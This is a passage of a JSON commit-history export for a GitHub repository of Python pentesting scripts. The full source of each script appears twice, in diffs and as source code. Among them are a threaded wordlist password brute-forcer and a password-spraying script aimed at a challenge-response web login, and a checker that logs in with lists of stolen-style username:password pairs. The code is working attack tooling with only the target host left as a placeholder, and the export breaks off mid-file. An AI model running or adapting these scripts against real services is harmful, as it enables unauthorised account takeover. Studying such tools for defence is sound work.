{
  "project_name": "003random",
  "repository_url": "https://github.com/003random/PyScripts",
  "repository_name": "PyScripts",
  "ecosystem": "github",
  "repo_category": "all",
  "analysis_period": {
    "start_date": "2018-05-16",
    "end_date": "2018-05-16",
    "full_history": false
  },
  "commits": [
    {"hash": "855d48278ad17b5ca1191f1eb92c7898b208f464", "msg": "Initial commit", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:22:32+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:22:32+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": [], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 2, "lines": 2, "files": 1, "modified_files": [{"old_path": null, "new_path": "README.md", "filename": "README.md", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,2 @@\n+# PyScripts\n+Some python scripts that I have created over the pas\n", "diff_parsed": {"added": [[1, "# PyScripts"], [2, "Some python scripts that I have created over the pas"]], "deleted": []}, "added_lines": 2, "deleted_lines": 0, "source_code": "# PyScripts\nSome python scripts that I have created over the pas\n", "source_code_before": null, "methods": [], "methods_before": [], "changed_methods": [], "nloc": null, "complexity": null, "token_count": null}], "dmm_unit_size": null, "dmm_unit_complexity": null, "dmm_unit_interfacing": null},
    {"hash": "60961eaf8d4275479216dc737564ccbf6edf8551", "msg": "Typo", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:23:17+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:23:17+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["855d48278ad17b5ca1191f1eb92c7898b208f464"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 2, "insertions": 2, "lines": 4, "files": 1, "modified_files": [{"old_path": "README.md", "new_path": "README.md", "filename": "README.md", "change_type": "ModificationType.MODIFY", "change_type_name": "MODIFY", "diff": "@@ -1,2 +1,2 @@\n-# PyScripts\n-Some python scripts that I have created over the pas\n+## PyScripts\n+Some python scripts that I have created over the past\n", "diff_parsed": {"added": [[1, "## PyScripts"], [2, "Some python scripts that I have created over the past"]], "deleted": [[1, "# PyScripts"], [2, "Some python scripts that I have created over the pas"]]}, "added_lines": 2, "deleted_lines": 2, "source_code": "## PyScripts\nSome python scripts that I have created over the past\n", "source_code_before": "# PyScripts\nSome python scripts that I have created over the pas\n", "methods": [], "methods_before": [], "changed_methods": [], "nloc": null, "complexity": null, "token_count": null}], "dmm_unit_size": null, "dmm_unit_complexity": null, "dmm_unit_interfacing": null},
    {"hash": "55266808a95abc7a52fcdbfde5900bc945c0767d", "msg": "Create simple_bruteforce.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:27:51+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:27:51+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["60961eaf8d4275479216dc737564ccbf6edf8551"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 69, "lines": 69, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/simple_bruteforce.py", "filename": "simple_bruteforce.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,69 @@\n+# Description\n+# Bruteforces the password of an given username, with a wordlist\n+\n+# Parameters\n+# Parameter 1: Username\n+# Parameter 2: Wordlist\n+\n+# Additional\n+# Replace [Host] with the host\n+\n+import sys\n+import requests\n+import hashlib\n+import signal\n+import json\n+from collections import namedtuple\n+from os import system\n+import re\n+from multiprocessing.dummy import Pool\n+\n+def signal_handler(signal, frame):\n+        print('Quiting')\n+        sys.exit(0)\n+\n+def login(loginID, password, getCookie = False):\n+    #get challenge\n+    try:\n+        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n+    except:\n+        return login(loginID, password, getCookie)\n+    s = r.content\n+    s = s[s.index('{'):s.index('}') + 1]\n+    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n+\n+    #hash password with challenge\n+    hash_dig = password\n+    try:\n+        for i in range(0, x.iterations):\n+            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n+        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n+    except:\n+        print \"[!] Error on loginID\",loginID\n+        return False\n+\n+    try:\n+        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n+    except:\n+        return login(loginID, password, getCookie)\n+\n+    if getCookie:\n+        return r.cookies\n+    return \"true\" in login.content\n+\n+def loginThread(password):\n+    username = sys.argv[1]\n+    if login(username, password):\n+        print '[+] {0} with password {1} \\n'.format(username, password),\n+        exitPls\n+        exit(1)\n+\n+print \"[*] Trying the passwords from {0} on the user {1}\".format(str(sys.argv[2]), str(sys.argv[1]))\n+\n+passwords = [line.rstrip('\\n') for line in open(str(sys.argv[2]))]\n+signal.signal(signal.SIGINT, signal_handler)\n+\n+pool = Pool(10)\n+asyncres = pool.map(loginThread, passwords)\n+pool.close()\n+pool.join()\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Bruteforces the password of an given username, with a wordlist"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Username"], [6, "# Parameter 2: Wordlist"], [7, ""], [8, "# Additional"], [9, "# Replace [Host] with the host"], [10, ""], [11, "import sys"], [12, "import requests"], [13, "import hashlib"], [14, "import signal"], [15, "import json"], [16, "from collections import namedtuple"], [17, "from os import system"], [18, "import re"], [19, "from multiprocessing.dummy import Pool"], [20, ""], [21, "def signal_handler(signal, frame):"], [22, "        print('Quiting')"], [23, "        sys.exit(0)"], [24, ""], [25, "def login(loginID, password, getCookie = False):"], [26, "    #get challenge"], [27, "    try:"], [28, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [29, "    except:"], [30, "        return login(loginID, password, getCookie)"], [31, "    s = r.content"], [32, "    s = s[s.index('{'):s.index('}') + 1]"], [33, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [34, ""], [35, "    #hash password with challenge"], [36, "    hash_dig = password"], [37, "    try:"], [38, "        for i in range(0, x.iterations):"], [39, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [40, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [41, "    except:"], [42, "        print \"[!] Error on loginID\",loginID"], [43, "        return False"], [44, ""], [45, "    try:"], [46, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [47, "    except:"], [48, "        return login(loginID, password, getCookie)"], [49, ""], [50, "    if getCookie:"], [51, "        return r.cookies"], [52, "    return \"true\" in login.content"], [53, ""], [54, "def loginThread(password):"], [55, "    username = sys.argv[1]"], [56, "    if login(username, password):"], [57, "        print '[+] {0} with password {1} \\n'.format(username, password),"], [58, "        exitPls"], [59, "        exit(1)"], [60, ""], [61, "print \"[*] Trying the passwords from {0} on the user {1}\".format(str(sys.argv[2]), str(sys.argv[1]))"], [62, ""], [63, "passwords = [line.rstrip('\\n') for line in open(str(sys.argv[2]))]"], [64, "signal.signal(signal.SIGINT, signal_handler)"], [65, ""], [66, "pool = Pool(10)"], [67, "asyncres = pool.map(loginThread, passwords)"], [68, "pool.close()"], [69, "pool.join()"]], "deleted": []}, "added_lines": 69, "deleted_lines": 0, "source_code": "# Description\n# Bruteforces the password of an given username, with a wordlist\n\n# Parameters\n# Parameter 1: Username\n# Parameter 2: Wordlist\n\n# Additional\n# Replace [Host] with the host\n\nimport sys\nimport requests\nimport hashlib\nimport signal\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef signal_handler(signal, frame):\n        print('Quiting')\n        sys.exit(0)\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n\n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef loginThread(password):\n    username = sys.argv[1]\n    if login(username, password):\n        print '[+] {0} with password {1} \\n'.format(username, password),\n        exitPls\n        exit(1)\n\nprint \"[*] Trying the passwords from {0} on the user {1}\".format(str(sys.argv[2]), str(sys.argv[1]))\n\npasswords = [line.rstrip('\\n') for line in open(str(sys.argv[2]))]\nsignal.signal(signal.SIGINT, signal_handler)\n\npool = Pool(10)\nasyncres = pool.map(loginThread, passwords)\npool.close()\npool.join()\n", "source_code_before": null, "methods": [{"name": "signal_handler", "start_line": 21, "end_line": 23}, {"name": "login", "start_line": 25, "end_line": 52}, {"name": "loginThread", "start_line": 54, "end_line": 59}], "methods_before": [], "changed_methods": [{"name": "login", "start_line": 25, "end_line": 52}, {"name": "signal_handler", "start_line": 21, "end_line": 23}, {"name": "loginThread", "start_line": 54, "end_line": 59}], "nloc": 48, "complexity": 9, "token_count": 360}], "dmm_unit_size": 0.28125, "dmm_unit_complexity": 0.28125, "dmm_unit_interfacing": 0.28125},
    {"hash": "61c2023d04e4485a01fc33e2e1de4a2d86d4a709", "msg": "Create webservices_search.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:33:06+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:33:06+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["55266808a95abc7a52fcdbfde5900bc945c0767d"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 44, "lines": 44, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/webservices_search.py", "filename": "webservices_search.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,44 @@\n+# Description\n+# Searches for a given text in all the webservice methods\n+\n+# Parameters\n+# Parameter 1: Input file with all the webservices\n+# Parameter 2: Session cookie\n+# Parameter 2: The search text\n+\n+# Additional\n+# Replace [Host] with the host\n+# Replace [Cookie_Name] with the session cookie's name\n+\n+import requests, sys, re\n+\n+input_file = sys.argv[1]\n+cookie = sys.argv[2]\n+search = sys.argv[3]\n+baseUrl = 'https://[Host]/Services/'\n+\n+class bcolors:\n+    HEADER = '\\033[95m'\n+    OKBLUE = '\\033[94m'\n+    OKGREEN = '\\033[92m'\n+    WARNING = '\\033[93m'\n+    FAIL = '\\033[91m'\n+    ENDC = '\\033[0m'\n+    BOLD = '\\033[1m'\n+    UNDERLINE = '\\033[4m'\n+\n+with open(input_file , 'r') as f:\n+    data = f.read()\n+urls = re.findall(r'([^ ]*?\\.asmx)', data)\n+\n+for url in urls:\n+    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})\n+    if response.status_code == 200:\n+#        print '[+] {0}'.format(url)\n+        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)\n+        for method in methods:\n+            if \"?op=\" in method:\n+                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})\n+                if m.status_code == 200:\n+                    if str(search) in m.content:\n+                        print bcolors.OKGREEN + \"[+] \" + str(method) + bcolors.ENDC\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Searches for a given text in all the webservice methods"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Input file with all the webservices"], [6, "# Parameter 2: Session cookie"], [7, "# Parameter 2: The search text"], [8, ""], [9, "# Additional"], [10, "# Replace [Host] with the host"], [11, "# Replace [Cookie_Name] with the session cookie's name"], [12, ""], [13, "import requests, sys, re"], [14, ""], [15, "input_file = sys.argv[1]"], [16, "cookie = sys.argv[2]"], [17, "search = sys.argv[3]"], [18, "baseUrl = 'https://[Host]/Services/'"], [19, ""], [20, "class bcolors:"], [21, "    HEADER = '\\033[95m'"], [22, "    OKBLUE = '\\033[94m'"], [23, "    OKGREEN = '\\033[92m'"], [24, "    WARNING = '\\033[93m'"], [25, "    FAIL = '\\033[91m'"], [26, "    ENDC = '\\033[0m'"], [27, "    BOLD = '\\033[1m'"], [28, "    UNDERLINE = '\\033[4m'"], [29, ""], [30, "with open(input_file , 'r') as f:"], [31, "    data = f.read()"], [32, "urls = re.findall(r'([^ ]*?\\.asmx)', data)"], [33, ""], [34, "for url in urls:"], [35, "    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})"], [36, "    if response.status_code == 200:"], [37, "#        print '[+] {0}'.format(url)"], [38, "        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)"], [39, "        for method in methods:"], [40, "            if \"?op=\" in method:"], [41, "                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})"], [42, "                if m.status_code == 200:"], [43, "                    if str(search) in m.content:"], [44, "                        print bcolors.OKGREEN + \"[+] \" + str(method) + bcolors.ENDC"]], "deleted": []}, "added_lines": 44, "deleted_lines": 0, "source_code": "# Description\n# Searches for a given text in all the webservice methods\n\n# Parameters\n# Parameter 1: Input file with all the webservices\n# Parameter 2: Session cookie\n# Parameter 2: The search text\n\n# Additional\n# Replace [Host] with the host\n# Replace [Cookie_Name] with the session cookie's name\n\nimport requests, sys, re\n\ninput_file = sys.argv[1]\ncookie = sys.argv[2]\nsearch = sys.argv[3]\nbaseUrl = 'https://[Host]/Services/'\n\nclass bcolors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\nwith open(input_file , 'r') as f:\n    data = f.read()\nurls = re.findall(r'([^ ]*?\\.asmx)', data)\n\nfor url in urls:\n    response = requests.get(baseUrl + url, cookies = {\"[Cookie_Name]\" : cookie})\n    if response.status_code == 200:\n#        print '[+] {0}'.format(url)\n        methods = re.findall(r'<a href=\\\"([^\\\"]*?)\\\"', response.content)\n        for method in methods:\n            if \"?op=\" in method:\n                m = requests.get(baseUrl + method, cookies = {\"[Cookie_Name]\" : cookie})\n                if m.status_code == 200:\n                    if str(search) in m.content:\n                        print bcolors.OKGREEN + \"[+] \" + str(method) + bcolors.ENDC\n", "source_code_before": null, "methods": [], "methods_before": [], "changed_methods": [], "nloc": 27, "complexity": 0, "token_count": 191}], "dmm_unit_size": null, "dmm_unit_complexity": null, "dmm_unit_interfacing": null},
    {"hash": "1946ff1d499ab207de3737ade3aca047581317d9", "msg": "Create simple_range_bruteforce.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:38:36+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:38:36+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["61c2023d04e4485a01fc33e2e1de4a2d86d4a709"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 81, "lines": 81, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/simple_range_bruteforce.py", "filename": "simple_range_bruteforce.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,81 @@\n+# Description\n+# Tries a given password on a range of userid's\n+\n+# Parameters\n+# Parameter 1: Password to try\n+# Parameter 2: Starting range (int)\n+# Parameter 2: Ending range (int)\n+\n+\n+# Additional\n+# Replace [Host] with the host\n+\n+import sys\n+import requests\n+import hashlib\n+import signal\n+import json\n+from collections import namedtuple\n+from os import system\n+import re\n+from multiprocessing.dummy import Pool\n+\n+def signal_handler(signal, frame):\n+        print('Quiting')\n+        sys.exit(0)\n+\n+def login(loginID, password, getCookie = False):\n+    #get challenge\n+    try:\n+        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n+    except:\n+        return login(loginID, password, getCookie)\n+    s = r.content\n+    s = s[s.index('{'):s.index('}') + 1]\n+    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n+    #hash password with challenge\n+    hash_dig = password\n+    try:\n+        for i in range(0, x.iterations):\n+            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n+        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n+    except:\n+        print \"[!] Error on loginID\",loginID\n+        return False\n+\n+    try:\n+        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n+    except:\n+        return login(loginID, password, getCookie)\n+\n+    if getCookie:\n+        return r.cookies\n+    return \"true\" in login.content\n+\n+def progress(count, total, suffix):\n+    bar_len = 20\n+    filled_len = int(round(bar_len * count / float(total)))\n+    percents = round(100.0 * count / float(total), 1)\n+    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n+    print '[{0}] {1}% [{2}]\\r'.format(bar, percents, suffix),\n+\n+def loginThread(account):\n+    global accounts, found, i\n+    if login(account, passTry):\n+        print '[+] {0} with password {1} \\n'.format(account, passTry),\n+        found = found + 1\n+    i = i + 1\n+    progress(i, len(accounts), found)\n+\n+passTry = sys.argv[1]\n+found = 0\n+i = 1\n+\n+accounts = range(int(sys.argv[2]), int(sys.argv[3]))\n+print \"[*] Trying account id's between {0} and {1}, with password {2}\".format(int(sys.argv[2]), int(sys.argv[3]), passTry)\n+\n+signal.signal(signal.SIGINT, signal_handler)\n+pool = Pool(10)\n+asyncres = pool.map(loginThread, accounts)\n+pool.close()\n+pool.join()\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Tries a given password on a range of userid's"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Password to try"], [6, "# Parameter 2: Starting range (int)"], [7, "# Parameter 2: Ending range (int)"], [8, ""], [9, ""], [10, "# Additional"], [11, "# Replace [Host] with the host"], [12, ""], [13, "import sys"], [14, "import requests"], [15, "import hashlib"], [16, "import signal"], [17, "import json"], [18, "from collections import namedtuple"], [19, "from os import system"], [20, "import re"], [21, "from multiprocessing.dummy import Pool"], [22, ""], [23, "def signal_handler(signal, frame):"], [24, "        print('Quiting')"], [25, "        sys.exit(0)"], [26, ""], [27, "def login(loginID, password, getCookie = False):"], [28, "    #get challenge"], [29, "    try:"], [30, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [31, "    except:"], [32, "        return login(loginID, password, getCookie)"], [33, "    s = r.content"], [34, "    s = s[s.index('{'):s.index('}') + 1]"], [35, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [36, "    #hash password with challenge"], [37, "    hash_dig = password"], [38, "    try:"], [39, "        for i in range(0, x.iterations):"], [40, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [41, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [42, "    except:"], [43, "        print \"[!] Error on loginID\",loginID"], [44, "        return False"], [45, ""], [46, "    try:"], [47, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [48, "    except:"], [49, "        return login(loginID, password, getCookie)"], [50, ""], [51, "    if getCookie:"], [52, "        return r.cookies"], [53, "    return \"true\" in login.content"], [54, ""], [55, "def progress(count, total, suffix):"], [56, "    bar_len = 20"], [57, "    filled_len = int(round(bar_len * count / float(total)))"], [58, "    percents = round(100.0 * count / float(total), 1)"], [59, "    bar = '=' * filled_len + '-' * (bar_len - filled_len)"], [60, "    print '[{0}] {1}% [{2}]\\r'.format(bar, percents, suffix),"], [61, ""], [62, "def loginThread(account):"], [63, "    global accounts, found, i"], [64, "    if login(account, passTry):"], [65, "        print '[+] {0} with password {1} \\n'.format(account, passTry),"], [66, "        found = found + 1"], [67, "    i = i + 1"], [68, "    progress(i, len(accounts), found)"], [69, ""], [70, "passTry = sys.argv[1]"], [71, "found = 0"], [72, "i = 1"], [73, ""], [74, "accounts = range(int(sys.argv[2]), int(sys.argv[3]))"], [75, "print \"[*] Trying account id's between {0} and {1}, with password {2}\".format(int(sys.argv[2]), int(sys.argv[3]), passTry)"], [76, ""], [77, "signal.signal(signal.SIGINT, signal_handler)"], [78, "pool = Pool(10)"], [79, "asyncres = pool.map(loginThread, accounts)"], [80, "pool.close()"], [81, "pool.join()"]], "deleted": []}, "added_lines": 81, "deleted_lines": 0, "source_code": "# Description\n# Tries a given password on a range of userid's\n\n# Parameters\n# Parameter 1: Password to try\n# Parameter 2: Starting range (int)\n# Parameter 2: Ending range (int)\n\n\n# Additional\n# Replace [Host] with the host\n\nimport sys\nimport requests\nimport hashlib\nimport signal\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef signal_handler(signal, frame):\n        print('Quiting')\n        sys.exit(0)\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    print '[{0}] {1}% [{2}]\\r'.format(bar, percents, suffix),\n\ndef loginThread(account):\n    global accounts, found, i\n    if login(account, passTry):\n        print '[+] {0} with password {1} \\n'.format(account, passTry),\n        found = found + 1\n    i = i + 1\n    progress(i, len(accounts), found)\n\npassTry = sys.argv[1]\nfound = 0\ni = 1\n\naccounts = range(int(sys.argv[2]), int(sys.argv[3]))\nprint \"[*] Trying account id's between {0} and {1}, with password {2}\".format(int(sys.argv[2]), int(sys.argv[3]), passTry)\n\nsignal.signal(signal.SIGINT, signal_handler)\npool = Pool(10)\nasyncres = pool.map(loginThread, accounts)\npool.close()\npool.join()\n", "source_code_before": null, "methods": [{"name": "signal_handler", "start_line": 23, "end_line": 25}, {"name": "login", "start_line": 27, "end_line": 53}, {"name": "progress", "start_line": 55, "end_line": 60}, {"name": "loginThread", "start_line": 62, "end_line": 68}], "methods_before": [], "changed_methods": [{"name": "progress", "start_line": 55, "end_line": 60}, {"name": "login", "start_line": 27, "end_line": 53}, {"name": "signal_handler", "start_line": 23, "end_line": 25}, {"name": "loginThread", "start_line": 62, "end_line": 68}], "nloc": 58, "complexity": 10, "token_count": 460}], "dmm_unit_size": 0.41025641025641024, "dmm_unit_complexity": 0.41025641025641024, "dmm_unit_interfacing": 0.2564102564102564},
    {"hash": "2f1e6db5549379dcf622d0859e7a14e0a8a0dea3", "msg": "Create webservice_premission_checker.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 16:51:01+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 16:51:01+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["1946ff1d499ab207de3737ade3aca047581317d9"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 64, "lines": 64, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/webservice_premission_checker.py", "filename": "webservice_premission_checker.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,64 @@\n+# Description\n+# Checks if a user, from a list of users, is authorized to a specefic webservice/method\n+\n+# Parameters\n+# Parameter 1: List with usernames and passwords divided by ':'\n+\n+# Additional\n+# Replace [Host] with the host\n+# Replace [Webservice] with the webservice name\n+# Replace [Method] with the webservice method name\n+\n+import sys\n+import requests\n+import hashlib\n+import json\n+from collections import namedtuple\n+from os import system\n+import re\n+from multiprocessing.dummy import Pool\n+\n+def login(loginID, password, getCookie = False):\n+    #get challenge\n+    try:\n+        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n+    except:\n+        return login(loginID, password, getCookie)\n+    s = r.content\n+    s = s[s.index('{'):s.index('}') + 1]\n+    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n+    \n+    #hash password with challenge\n+    hash_dig = password\n+    try:\n+        for i in range(0, x.iterations):\n+            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n+        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n+    except:\n+        print \"[!] Error on loginID\",loginID\n+        return False\n+    \n+    try:\n+        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n+    except:\n+        return login(loginID, password, getCookie)\n+\n+    if getCookie:\n+        return r.cookies\n+    return \"true\" in login.content\n+\n+userList = sys.argv[1]\n+\n+with open(userList) as f:\n+    lines = f.readlines()\n+\n+for line in lines:\n+    username, password = line.split(\" : \")\n+    cookie = login(username, password, True)\n+    try:\n+        switchSession = requests.get('https://[Host]/Services/[Webservice][Method]', cookies=cookie)\n+        if switchSession.status_code == 200:\n+            print username, password\n+    except:\n+        if switchSession.status_code == 200:\n+            print username, password\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Checks if a user, from a list of users, is authorized to a specefic webservice/method"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: List with usernames and passwords divided by ':'"], [6, ""], [7, "# Additional"], [8, "# Replace [Host] with the host"], [9, "# Replace [Webservice] with the webservice name"], [10, "# Replace [Method] with the webservice method name"], [11, ""], [12, "import sys"], [13, "import requests"], [14, "import hashlib"], [15, "import json"], [16, "from collections import namedtuple"], [17, "from os import system"], [18, "import re"], [19, "from multiprocessing.dummy import Pool"], [20, ""], [21, "def login(loginID, password, getCookie = False):"], [22, "    #get challenge"], [23, "    try:"], [24, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [25, "    except:"], [26, "        return login(loginID, password, getCookie)"], [27, "    s = r.content"], [28, "    s = s[s.index('{'):s.index('}') + 1]"], [29, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [30, ""], [31, "    #hash password with challenge"], [32, "    hash_dig = password"], [33, "    try:"], [34, "        for i in range(0, x.iterations):"], [35, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [36, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [37, "    except:"], [38, "        print \"[!] Error on loginID\",loginID"], [39, "        return False"], [40, ""], [41, "    try:"], [42, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [43, "    except:"], [44, "        return login(loginID, password, getCookie)"], [45, ""], [46, "    if getCookie:"], [47, "        return r.cookies"], [48, "    return \"true\" in login.content"], [49, ""], [50, "userList = sys.argv[1]"], [51, ""], [52, "with open(userList) as f:"], [53, "    lines = f.readlines()"], [54, ""], [55, "for line in lines:"], [56, "    username, password = line.split(\" : \")"], [57, "    cookie = login(username, password, True)"], [58, "    try:"], [59, "        switchSession = requests.get('https://[Host]/Services/[Webservice][Method]', cookies=cookie)"], [60, "        if switchSession.status_code == 200:"], [61, "            print username, password"], [62, "    except:"], [63, "        if switchSession.status_code == 200:"], [64, "            print username, password"]], "deleted": []}, "added_lines": 64, "deleted_lines": 0, "source_code": "# Description\n# Checks if a user, from a list of users, is authorized to a specefic webservice/method\n\n# Parameters\n# Parameter 1: List with usernames and passwords divided by ':'\n\n# Additional\n# Replace [Host] with the host\n# Replace [Webservice] with the webservice name\n# Replace [Method] with the webservice method name\n\nimport sys\nimport requests\nimport hashlib\nimport json\nfrom 